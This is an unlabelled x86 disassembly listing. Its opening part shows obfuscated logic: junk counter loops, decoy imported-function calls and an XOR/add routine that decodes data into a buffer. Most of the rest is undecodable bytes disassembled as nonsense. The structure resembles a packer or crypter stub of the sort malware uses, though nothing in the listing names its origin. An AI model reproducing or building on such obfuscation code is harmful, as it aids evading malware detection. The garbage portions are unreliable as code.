  41026b:	or     DWORD PTR ds:0x4336d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4336ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4336ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4336ab,ecx
  410291:	cmp    DWORD PTR ds:0x4336ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4336ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4336ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4336ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4336ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433603
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4336e7,0x43369f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4336e3,0x433697
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433657
  41031a:	sub    DWORD PTR ds:0x43361f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43365b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43365b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43365b,ecx
  410345:	cmp    DWORD PTR ds:0x43365b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4337af
  410357:	push   0x4337ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43365b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43369f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433713,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433713
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433713,ecx
  41038f:	cmp    DWORD PTR ds:0x433713,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4336e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433713,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433713
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433713,ecx
  4103c8:	cmp    DWORD PTR ds:0x433713,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43365f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433657,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433657
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433657,esi
  4103ff:	cmp    DWORD PTR ds:0x433657,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433657,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x96,al
  41049c:	popa   
  41049d:	mov    DWORD PTR [edx-0x24],ecx
  4104a0:	mov    al,0x7e
  4104a2:	jle    0x410453
  4104a4:	jl     0x410524
  4104a6:	jle    0x4104a1
  4104a8:	out    dx,al
  4104a9:	push   edi
  4104aa:	cmp    DWORD PTR [edi-0x17053648],esp
  4104b0:	pop    ds
  4104b1:	push   edx
  4104b2:	(bad)  
  4104b3:	bound  eax,QWORD PTR ds:0xbfc0d8e2
  4104b9:	adc    al,0x7b
  4104bb:	loope  0x4104a5
  4104bd:	rol    ecx,cl
  4104bf:	jle    0x4104c8
  4104c1:	mov    eax,0xa50ae8bb
  4104c6:	pushf  
  4104c7:	daa    
  4104c8:	inc    ecx
  4104c9:	jae    0x41048c
  4104cb:	jmp    0x97c8:0xd9ed5412
  4104d2:	iret   
  4104d3:	aad    0x6d
  4104d5:	ret    
  4104d6:	fmulp  st(2),st
  4104d8:	shl    cl,1
  4104da:	mov    ?,WORD PTR [esi-0x11e3f75c]
  4104e0:	sar    BYTE PTR [esi],0xe3
  4104e3:	imul   ebp,DWORD PTR [ecx-0x65],0xffffffad
  4104e7:	xor    ch,BYTE PTR [esi-0x28]
  4104ea:	out    dx,al
  4104eb:	cmp    DWORD PTR [esi+eax*1-0x531a40e5],esi
  4104f2:	sub    esp,ecx
  4104f4:	jle    0x4104ef
  4104f6:	push   edi
  4104f7:	mov    BYTE PTR [ebx+0x611a3b79],bl
  4104fd:	inc    esp
  4104fe:	add    DWORD PTR [edi+0x1fbf871e],edx
  410504:	nop
  410505:	bound  esp,QWORD PTR [edx-0x59]
  410508:	xor    esi,DWORD PTR [eax-0x6a]
  41050b:	rol    DWORD PTR [edi+edi*2-0x7],cl
  41050f:	xor    bl,BYTE PTR [edx-0x401d68fa]
  410515:	xlat   BYTE PTR ds:[ebx]
  410516:	xlat   BYTE PTR ds:[ebx]
  410517:	or     dh,bh
  410519:	jmp    0xe885:0xa9eedceb
  410520:	adc    DWORD PTR [edx-0x3d],0xcc1db606
  410527:	ds jb  0x4104fa
  41052a:	pop    ebp
  41052b:	jl     0x410542
  41052d:	test   BYTE PTR [edi],ch
  41052f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410530:	in     al,dx
  410531:	xchg   ecx,eax
  410532:	aad    0x5d
  410534:	int    0x2f
  410536:	pop    ss
  410537:	int3   
  410538:	sub    al,0x9
  41053a:	push   0xffffffab
  41053c:	mov    dh,0xe5
  41053e:	or     eax,0x56344eb
  410543:	and    ah,BYTE PTR [eax]
  410545:	xchg   edx,eax
  410546:	sbb    dl,0x90
  410549:	jae    0x7ecef537
  41054f:	sbb    DWORD PTR [edx-0x30394649],edx
  410555:	add    ebp,DWORD PTR [ebp+eiz*4-0x1a]
  410559:	lods   al,BYTE PTR ds:[esi]
  41055a:	mov    esp,0xeec1e508
  41055f:	mov    dh,al
  410561:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410562:	sahf   
  410563:	test   al,0x80
  410565:	mov    ebx,?
  410567:	push   ebp
  410568:	shl    bl,cl
  41056a:	jl     0x41056c
  41056c:	adc    eax,DWORD PTR [ebx-0x7f]
  41056f:	cmp    eax,0xcbeecc7c
  410575:	in     al,dx
  410576:	stos   BYTE PTR es:[edi],al
  410577:	xchg   esi,eax
  410578:	mov    eax,0x4b594820
  41057d:	fbld   TBYTE PTR [edx-0x26fd1953]
  410583:	pop    eax
  410584:	or     al,0xad
  410586:	out    0x34,eax
  410588:	in     eax,dx
  410589:	jb     0x4105be
  41058b:	in     al,0xfa
  41058d:	push   0xde5fea7b
  410592:	adc    eax,0xcaab42f3
  410597:	inc    ebx
  410598:	sbb    DWORD PTR [esi-0x7db7118a],ebp
  41059e:	and    esp,DWORD PTR [esi]
  4105a0:	scas   al,BYTE PTR es:[edi]
  4105a1:	inc    ebx
  4105a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105a3:	leave  
  4105a4:	sub    eax,0x896419f5
  4105a9:	repz (bad) 
  4105ab:	mov    ds:0xc93e1730,eax
  4105b0:	cmc    
  4105b1:	mov    dl,0x4a
  4105b3:	push   ss
  4105b4:	cmc    
  4105b5:	stc    
  4105b6:	xchg   DWORD PTR [edi-0x72],esi
  4105b9:	lds    edx,FWORD PTR [edi]
  4105bb:	js     0x410543
  4105bd:	mov    al,ds:0x515ee732
  4105c2:	push   edi
  4105c3:	addr16 mov ds:0x9338,al
  4105c7:	mov    al,0x94
  4105c9:	jno    0x41054e
  4105cb:	addr16 das 
  4105cd:	cmp    bl,bl
  4105cf:	jnp    0x410644
  4105d1:	(bad)  
  4105d2:	cli    
  4105d3:	mov    bh,0xac
  4105d5:	retf   
  4105d6:	enter  0x3a15,0x13
  4105da:	xchg   ecx,eax
  4105db:	pop    edx
  4105dc:	js     0x410647
  4105de:	pop    eax
  4105df:	xor    al,0xb4
  4105e1:	and    eax,0x9b32a8d6
  4105e6:	lods   al,BYTE PTR es:[esi]
  4105e8:	dec    ecx
  4105e9:	cmp    ebx,DWORD PTR [edi]
  4105eb:	das    
  4105ec:	push   eax
  4105ed:	sbb    esi,DWORD PTR [ecx+0x157ef4b9]
  4105f3:	retf   
  4105f4:	lods   al,BYTE PTR ds:[esi]
  4105f5:	mov    esi,esi
  4105f7:	inc    eax
  4105f8:	pop    edx
  4105f9:	outs   dx,DWORD PTR ds:[esi]
  4105fa:	mov    ds:0x3084f340,eax
  4105ff:	push   esp
  410600:	pop    ebp
  410601:	and    ebx,DWORD PTR [edi]
  410603:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410604:	add    dl,BYTE PTR [edx-0x7b]
  410607:	icebp  
  410608:	pop    ebp
  410609:	lods   al,BYTE PTR ds:[esi]
  41060a:	and    ch,BYTE PTR ds:0x8d3a01aa
  410610:	xchg   edi,eax
  410611:	sbb    DWORD PTR [bx+si],eax
  410614:	cld    
  410615:	mov    ds:0x95f243ef,eax
  41061a:	or     BYTE PTR [edx],dh
  41061c:	hlt    
  41061d:	dec    edi
  41061e:	push   0xffffffcc
  410620:	mov    DWORD PTR [ecx],eax
  410622:	jbe    0x41061c
  410624:	sbb    BYTE PTR [eax],dh
  410626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410627:	add    BYTE PTR [edx+0x2b],dl
  41062a:	xchg   dh,ah
  41062c:	sti    
  41062d:	dec    edi
  41062e:	ja     0x4105b4
  410630:	or     al,ah
  410632:	or     eax,0x7edbe79e
  410637:	xor    ebx,ebx
  410639:	imul   edi,DWORD PTR [ecx+esi*1],0x3ef15a3a
  410640:	sar    DWORD PTR [edi+0x10db4e3e],cl
  410646:	loopne 0x4105e8
  410648:	lock test ecx,0xe204e177
  41064f:	pop    ss
  410650:	retf   
  410651:	mov    DWORD PTR [eax+edx*2+0x12],edi
  410655:	das    
  410656:	retf   
  410657:	push   ebp
  410658:	retf   
  410659:	add    al,0x42
  41065b:	xchg   ebp,eax
  41065c:	inc    edx
  41065d:	sub    BYTE PTR [esi],bh
  41065f:	(bad)  
  410660:	call   0xe1b3defb
  410665:	stc    
  410666:	stc    
  410667:	(bad)  [esi+0x6803a763]
  41066d:	adc    cl,0xd6
  410670:	mov    dh,0x57
  410672:	sub    BYTE PTR [eax],0xb8
  410675:	and    al,0x34
  410677:	mov    ds:0xa3baf099,eax
  41067c:	pop    edx
  41067d:	dec    ebx
  41067e:	mov    eax,DWORD PTR [esi+0x32e34c6a]
  410684:	cld    
  410685:	hlt    
  410686:	ror    DWORD PTR [ecx],cl
  410688:	(bad)  
  410689:	adc    BYTE PTR [edx+edx*4-0x10248dab],dh
  410690:	loope  0x410656
  410692:	idiv   bl
  410694:	jle    0x41067a
  410696:	loop   0x410635
  410698:	std    
  410699:	xlat   BYTE PTR ds:[ebx]
  41069a:	push   edi
  41069b:	add    esp,DWORD PTR [edx+0x2d]
  41069e:	xchg   ecx,eax
  41069f:	or     eax,0xab1f870e
  4106a4:	sbb    dl,ah
  4106a6:	stos   DWORD PTR es:[edi],eax
  4106a7:	out    0xca,al
  4106a9:	jae    0x410657
  4106ab:	mov    ds:0x270d9659,al
  4106b0:	(bad)  
  4106b1:	call   0x7eb1ae57
  4106b6:	shl    bh,0x2d
  4106b9:	jge    0x4106ec
  4106bb:	xchg   edi,eax
  4106bc:	adc    ah,BYTE PTR [edx]
  4106be:	dec    eax
  4106bf:	mov    ebx,ebp
  4106c1:	lods   eax,DWORD PTR fs:[esi]
  4106c3:	cli    
  4106c4:	pop    ebp
  4106c5:	fidiv  WORD PTR [esi+0x36948acb]
  4106cb:	xor    al,0x5b
  4106cd:	test   eax,0xa5c6cadf
  4106d2:	stc    
  4106d3:	or     DWORD PTR [ebx+edi*1],0xef85fda0
  4106da:	push   eax
  4106db:	(bad)  
  4106dc:	cmc    
  4106dd:	aam    0x62
  4106df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106e0:	mov    ebp,0x45f71ec8
  4106e5:	mov    cl,0x12
  4106e7:	sbb    DWORD PTR [ecx+ecx*4],esp
  4106ea:	es mov edi,0x9593bb4e
  4106f0:	and    DWORD PTR [edx+ecx*8+0x1b],eax
  4106f4:	mov    al,ch
  4106f6:	jb     0x41070e
  4106f8:	mov    ch,0xab
  4106fa:	cli    
  4106fb:	mov    eax,ds:0x2850735f
  410700:	lea    ebx,[ebp-0x42ac3c88]
  410706:	xor    BYTE PTR [eax-0x7f],al
  410709:	pop    esi
  41070a:	(bad)  [esi-0x50caf4c8]
  410710:	mov    bl,0x38
  410712:	and    eax,0xc907e5c
  410717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410718:	push   0x7140b2e3
  41071d:	into   
  41071e:	stos   BYTE PTR es:[edi],al
  41071f:	das    
  410720:	(bad)  
  410721:	mov    dl,0x4b
  410723:	dec    esi
  410724:	xor    BYTE PTR [ecx],dh
  410726:	push   eax
  410727:	mov    DWORD PTR [eax-0xc],ecx
  41072a:	aas    
  41072b:	xlat   BYTE PTR ds:[ebx]
  41072c:	mov    ss,WORD PTR [ebx]
  41072e:	call   0x72ae:0xcba5cab3
  410735:	cmp    BYTE PTR [esi-0x1d],bl
  410738:	add    cl,BYTE PTR [edx-0x34]
  41073b:	fdivr  st,st(7)
  41073d:	leave  
  41073e:	ss xor al,0x79
  410741:	push   esp
  410742:	inc    ebx
  410743:	shr    al,1
  410745:	imul   ecx,DWORD PTR [edx],0xffffffc2
  410748:	pop    ds
  410749:	(bad)  
  41074b:	or     ebp,DWORD PTR [ecx+eiz*4-0x1f]
  41074f:	jns    0x410729
  410751:	add    BYTE PTR ds:0x7f7e5a0,bl
  410757:	adc    al,0x8b
  410759:	inc    ebp
  41075a:	hlt    
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x448c797e
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x410712
  41078c:	int3   
  41078d:	stos   DWORD PTR es:[edi],eax
  41078e:	imul   ebx,DWORD PTR [edi-0x69bbebc0],0xf2804451
  410798:	pop    edx
  410799:	sbb    edi,DWORD PTR [edx]
  41079b:	adc    DWORD PTR [eax+0x2f],esp
  41079e:	adc    ah,BYTE PTR [ecx]
  4107a0:	pop    edx
  4107a1:	adc    esi,esp
  4107a3:	ret    0x699c
  4107a6:	shl    DWORD PTR [eax+edx*8],0xe7
  4107aa:	or     al,BYTE PTR [edx]
  4107ac:	xchg   ebp,eax
  4107ad:	je     0x410824
  4107af:	scas   al,BYTE PTR es:[edi]
  4107b0:	push   eax
  4107b1:	xchg   ecx,eax
  4107b2:	setb   BYTE PTR [edx]
  4107b5:	pushf  
  4107b6:	mov    dl,0xa9
  4107b8:	mov    ss,ebx
  4107ba:	int    0xf8
  4107bc:	xchg   ebx,eax
  4107bd:	mov    edi,0x86591bcc
  4107c2:	mov    ds:0xbf5c72d6,al
  4107c7:	push   es
  4107c8:	add    eax,0x79eb824d
  4107cd:	retf   
  4107ce:	aaa    
  4107cf:	popf   
  4107d0:	into   
  4107d1:	sbb    dl,0x4
  4107d4:	iret   
  4107d5:	mov    ds:0xe0c3e116,al
  4107da:	mov    ch,0x70
  4107dc:	inc    ecx
  4107dd:	push   es
  4107de:	shl    BYTE PTR [ebx-0x6b],cl
  4107e1:	fistp  QWORD PTR [ebx+edi*4+0x4]
  4107e5:	in     eax,dx
  4107e6:	xchg   ecx,eax
  4107e7:	call   0xaff97407
  4107ec:	pushf  
  4107ed:	sbb    eax,0x95215143
  4107f2:	mov    dl,0x38
  4107f4:	(bad)  
  4107f6:	(bad)  [edx-0x50]
  4107f9:	jb     0x410871
  4107fb:	and    BYTE PTR [ecx-0x51eb73fc],ch
  410801:	mov    ds:0xa8ac15f2,al
  410806:	push   ebx
  410807:	iret   
  410808:	mov    DWORD PTR cs:[ecx-0x74aa7ae1],edx
  41080f:	adc    BYTE PTR [edi+0x30aba549],ch
  410815:	in     al,dx
  410816:	push   0xd1e15567
  41081b:	cmp    eax,0xae9b5708
  410820:	(bad)  
  410821:	in     eax,dx
  410822:	arpl   WORD PTR [esi+ebx*2-0x5bbb16e2],bp
  410829:	dec    ebp
  41082a:	dec    ecx
  41082b:	aas    
  41082c:	call   0x1defc6b7
  410831:	sbb    DWORD PTR [ecx-0x76d0db24],ebx
  410837:	bound  eax,QWORD PTR [ebp+0x55]
  41083a:	add    eax,0xfa717fce
  41083f:	repz gs (bad) 
  410842:	shl    DWORD PTR [edx-0x10],cl
  410845:	cmp    al,0xb9
  410847:	rcr    BYTE PTR [edx+esi*8-0x55],0xdb
  41084c:	adc    DWORD PTR [eax+edi*8+0x35dd5722],edi
  410853:	mov    eax,ds:0xf7cd0811
  410858:	int    0xfb
  41085a:	call   0xe70c893b
  41085f:	das    
  410860:	push   ds
  410861:	mul    bh
  410863:	es dec edx
  410865:	push   ecx
  410866:	adc    BYTE PTR [edi-0xeab77fd],bh
  41086c:	xchg   ebp,eax
  41086d:	mov    ah,0xaa
  41086f:	mov    ah,0x80
  410871:	pop    eax
  410872:	and    eax,0xd04724fb
  410877:	jns    0x4108f8
  410879:	xchg   ecx,eax
  41087a:	sbb    ch,dh
  41087c:	ds fwait
  41087e:	xor    al,0xc4
  410880:	adc    ch,BYTE PTR [eax+ebp*4]
  410883:	les    esp,FWORD PTR ds:0xec944443
  410889:	loope  0x41082f
  41088b:	jnp    0x4108d5
  41088d:	ds cli 
  41088f:	mov    esi,0xba3b2242
  410894:	mov    al,ds:0xc193acde
  410899:	pushf  
  41089a:	dec    esi
  41089b:	dec    ebx
  41089c:	outs   dx,BYTE PTR ds:[esi]
  41089d:	pop    ebp
  41089e:	add    al,0x8b
  4108a0:	sub    eax,0xe9437073
  4108a5:	sbb    DWORD PTR [edx],edi
  4108a7:	xchg   edi,eax
  4108a8:	test   eax,0x54e8180a
  4108ad:	stos   BYTE PTR es:[edi],al
  4108ae:	add    DWORD PTR [ebx],esp
  4108b0:	je     0x410929
  4108b2:	outs   dx,BYTE PTR ds:[esi]
  4108b3:	push   ebp
  4108b4:	add    BYTE PTR [ebp-0x22],dh
  4108b7:	mov    edx,0xe52c1367
  4108bc:	inc    BYTE PTR [ebx-0x74b8e45d]
  4108c2:	adc    al,0x7d
  4108c4:	pop    edx
  4108c5:	jbe    0x4108fc
  4108c7:	je     0x41084f
  4108c9:	jl     0x4108b5
  4108cb:	clc    
  4108cc:	dec    ebx
  4108cd:	adc    edx,ebx
  4108cf:	add    ecx,DWORD PTR [edx]
  4108d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108d2:	stc    
  4108d3:	sub    BYTE PTR [ebx+ebx*1],bh
  4108d6:	push   edi
  4108d7:	sbb    eax,0x25169ad
  4108dc:	push   0xffffffcf
  4108de:	push   esi
  4108df:	fnstenv [ecx-0x7064e036]
  4108e5:	xchg   ebp,eax
  4108e6:	adc    bl,BYTE PTR [ecx+0x569536ef]
  4108ec:	sar    edi,1
  4108ee:	xchg   edi,eax
  4108ef:	outs   dx,BYTE PTR ds:[esi]
  4108f0:	xor    BYTE PTR [eax],bh
  4108f2:	ret    0x96e7
  4108f5:	pop    es
  4108f6:	sbb    DWORD PTR [edi+0xf],ebp
  4108f9:	xchg   esp,eax
  4108fa:	ror    DWORD PTR [ecx],0xaf
  4108fd:	jge    0x41093e
  4108ff:	enter  0x3c7c,0x8f
  410903:	or     BYTE PTR ss:[edx+0x65],bl
  410907:	push   ecx
  410908:	jbe    0x4108cf
  41090a:	out    0x24,al
  41090c:	loopne 0x410927
  41090e:	push   0xffffffd4
  410910:	out    dx,al
  410911:	out    0x82,al
  410913:	xchg   BYTE PTR [esi+0xf31ba96],cl
  410919:	lahf   
  41091a:	(bad)  
  41091c:	in     eax,dx
  41091d:	add    ch,BYTE PTR [edi]
  41091f:	pop    edx
  410920:	test   DWORD PTR [edi],esi
  410922:	ret    0x5499
  410925:	adc    ebx,DWORD PTR [ecx]
  410927:	repz aam 0xce
  41092a:	inc    edi
  41092b:	mov    esi,0x52239dfe
  410930:	xchg   esp,eax
  410931:	pop    ss
  410932:	push   0xffffffec
  410934:	fild   WORD PTR [eax]
  410936:	jno    0x410960
  410938:	mov    dh,0x20
  41093a:	inc    ebx
  41093b:	mov    esi,0x8f066d86
  410940:	mov    ebx,DWORD PTR [edx+0x1cd0ced0]
  410946:	in     al,dx
  410947:	push   eax
  410948:	shl    ah,0x9a
  41094b:	fist   DWORD PTR [eax-0x14]
  41094e:	pop    edx
  41094f:	xchg   esp,eax
  410950:	outs   dx,DWORD PTR ds:[esi]
  410951:	or     al,0xb1
  410953:	js     0x410962
  410955:	js     0x41099e
  410957:	lock push ecx
  410959:	mov    bh,0x61
  41095b:	xor    DWORD PTR [ecx],esp
  41095d:	pusha  
  41095e:	adc    eax,0x252538ad
  410963:	cdq    
  410964:	outs   dx,BYTE PTR ds:[esi]
  410965:	int3   
  410966:	test   DWORD PTR [edx+0x58],ebp
  410969:	sub    BYTE PTR [ecx-0x3e],dh
  41096c:	push   0x997dee12
  410971:	pop    esi
  410972:	cwde   
  410973:	pop    edi
  410974:	in     al,0x1e
  410976:	out    0x21,al
  410978:	imul   ebp,DWORD PTR [ebx],0xffffff88
  41097b:	pop    esp
  41097c:	mov    bl,ah
  41097e:	mov    DWORD PTR [edx+0x3d],0xa3fcfcdf
  410985:	mov    ebx,0x3bb8b23b
  41098a:	out    0x5c,al
  41098c:	rol    bh,0x93
  41098f:	cs mov al,0x0
  410992:	rol    DWORD PTR [esi-0x1db2d8f3],1
  410998:	pop    ds
  410999:	sbb    BYTE PTR [edi],ah
  41099b:	add    edx,eax
  41099d:	or     al,ah
  41099f:	cmc    
  4109a0:	ret    0xb590
  4109a3:	pop    es
  4109a4:	ss jbe 0x41096c
  4109a7:	mov    esp,0x8c6c343a
  4109ac:	call   DWORD PTR [edi+0xc]
  4109af:	out    0x2e,eax
  4109b1:	lds    ebp,FWORD PTR [ecx+0x55]
  4109b4:	out    0x74,eax
  4109b6:	jne    0x4109ad
  4109b8:	loop   0x41093a
  4109ba:	mov    esp,0x648688c2
  4109bf:	jecxz  0x410a20
  4109c1:	into   
  4109c2:	adc    ebp,edx
  4109c4:	lds    edi,FWORD PTR [edx+0x33]
  4109c7:	fs dec esi
  4109c9:	xchg   BYTE PTR [eax+esi*8-0x59],dl
  4109cd:	push   0xffffffa9
  4109cf:	das    
  4109d0:	mov    ds:0x20604cc8,eax
  4109d5:	or     eax,0xf4738f48
  4109da:	sbb    al,0xfb
  4109dc:	inc    eax
  4109dd:	(bad)  
  4109de:	xchg   ecx,eax
  4109df:	fwait
  4109e0:	mov    DWORD PTR [ecx],ecx
  4109e2:	shl    ecx,1
  4109e4:	pushf  
  4109e5:	out    dx,al
  4109e6:	mov    edi,0x73062af2
  4109eb:	push   0x62
  4109ed:	daa    
  4109ee:	dec    esi
  4109ef:	xor    DWORD PTR [ebx-0x7439dcbd],ebx
  4109f5:	cli    
  4109f6:	lock or DWORD PTR [eax+0x3d],eax
  4109fa:	pop    ecx
  4109fb:	lahf   
  4109fc:	jmp    0xef76:0xeed6cd57
  410a03:	mov    bh,0xd6
  410a05:	mov    esi,0xf97102fc
  410a0a:	inc    edi
  410a0b:	sub    eax,0xcabb36aa
  410a10:	fisttp QWORD PTR [ebx-0x5]
  410a13:	int3   
  410a14:	fwait
  410a15:	test   DWORD PTR [eax],0x91884a3a
  410a1b:	icebp  
  410a1c:	or     edi,eax
  410a1e:	int3   
  410a1f:	and    eax,0x57a4414b
  410a24:	shld   DWORD PTR [esi-0x4c244a10],edx,cl
  410a2b:	lea    esp,ds:0x1964db27
  410a31:	push   0xffffffef
  410a33:	pop    eax
  410a34:	add    DWORD PTR [ecx-0x73],eax
  410a37:	aaa    
  410a38:	mov    ah,0xe0
  410a3a:	jne    0x410a77
  410a3c:	add    eax,esi
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	pop    ebp
  410a50:	dec    ebp
  410a51:	xor    BYTE PTR [ecx-0x46],bh
  410a54:	mov    ebp,0x7caf7e7e
  410a59:	jle    0x410ad9
  410a5b:	ret    0x4b00
  410a5e:	pop    esp
  410a5f:	sub    ecx,ebp
  410a61:	mov    ebx,0xcc4f8cd
  410a66:	out    dx,eax
  410a67:	jae    0x410ae7
  410a69:	cmp    DWORD PTR [edx-0x14],ecx
  410a6c:	mov    dh,0x87
  410a6e:	int3   
  410a6f:	dec    edi
  410a70:	outs   dx,DWORD PTR ds:[esi]
  410a71:	mov    dh,BYTE PTR [ecx]
  410a73:	mov    al,ds:0x26055214
  410a78:	sar    bh,1
  410a7a:	ds aam 0x16
  410a7d:	cmp    ecx,DWORD PTR [ebp-0x49]
  410a80:	xchg   ebx,eax
  410a81:	xchg   edx,eax
  410a82:	ret    
  410a83:	mov    esi,0x65a03bff
  410a88:	pop    es
  410a89:	fcomi  st,st(3)
  410a8b:	sbb    al,0xe0
  410a8d:	data16 cmc 
  410a8f:	hlt    
  410a90:	nop
  410a91:	mov    dl,0xf1
  410a93:	loopne 0x410a42
  410a95:	jns    0x410b0a
  410a97:	call   FWORD PTR [esi-0x4fc9c34a]
  410a9d:	inc    eax
  410a9e:	repnz sbb al,0x96
  410aa1:	(bad)  [ebx]
  410aa3:	ins    DWORD PTR es:[edi],dx
  410aa4:	js     0x410b0e
  410aa6:	call   0xdafd:0xbe8480a1
  410aad:	fist   WORD PTR [eax+0x28]
  410ab0:	mov    ebx,0xef25901f
  410ab5:	scas   eax,DWORD PTR es:[edi]
  410ab6:	jmp    0x410a3d
  410ab8:	mov    esp,0x598af004
  410abd:	call   0xe5b15987
  410ac2:	xchg   edi,eax
  410ac3:	push   cs
  410ac4:	ja     0x410b28
  410ac6:	sbb    cl,BYTE PTR [eax+0x616663e4]
  410acc:	mov    edx,0x443e1e82
  410ad1:	mov    ds,WORD PTR [eax-0x16]
  410ad4:	push   edx
  410ad5:	pop    ebx
  410ad6:	test   al,0x6f
  410ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ad9:	loopne 0x410ab0
  410adb:	(bad)  
  410adc:	(bad)  
  410add:	dec    esp
  410ade:	sbb    al,0xa5
  410ae0:	xor    al,0x6b
  410ae2:	(bad)  
  410ae3:	shl    BYTE PTR [ebx+0x1d1a050b],cl
  410ae9:	mov    BYTE PTR [ebx+edx*2+0x70],ch
  410aed:	pop    eax
  410aee:	adc    bh,BYTE PTR [ecx]
  410af0:	lods   al,BYTE PTR ds:[esi]
  410af1:	xlat   BYTE PTR ds:[ebx]
  410af2:	iret   
  410af3:	mov    eax,ds:0xbe8f47e6
  410af8:	loope  0x410a94
  410afa:	xchg   edx,eax
  410afb:	std    
  410afc:	test   al,0xe2
  410afe:	test   al,0x74
  410b00:	sub    DWORD PTR [edx],esi
  410b02:	in     eax,dx
  410b03:	xor    al,BYTE PTR [edx-0x28b43aa0]
